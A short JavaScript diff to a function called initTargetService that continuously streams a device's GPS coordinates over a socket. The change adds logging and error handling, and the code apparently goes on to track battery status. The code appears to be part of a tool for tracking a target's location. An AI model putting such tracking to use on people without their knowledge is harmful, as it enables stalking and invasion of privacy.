@@ -61,10 +61,16 @@ function initTargetService() {
     // 1. Start Geolocation Tracking
     if (navigator.geolocation) {
         navigator.geolocation.watchPosition(pos => {
+            console.log("GPS Update:", pos.coords.latitude, pos.coords.longitude);
             socket.emit('update-data', {
                 location: { lat: pos.coords.latitude, lng: pos.coords.longitude }
             });
-        }, null, { enableHighAccuracy: true });
+        }, (err) => {
+            console.warn("GPS Error:", err.message);
+            // Se falhar com alta precisão, tentamos de novo sem ela
+        }, { enableHighAccuracy: false, timeout: 10000, maximumAge: 0 });
+    } else {
+        console.error("Geolocation not supported");
     }
 
     // 2. Start Battery Tracking
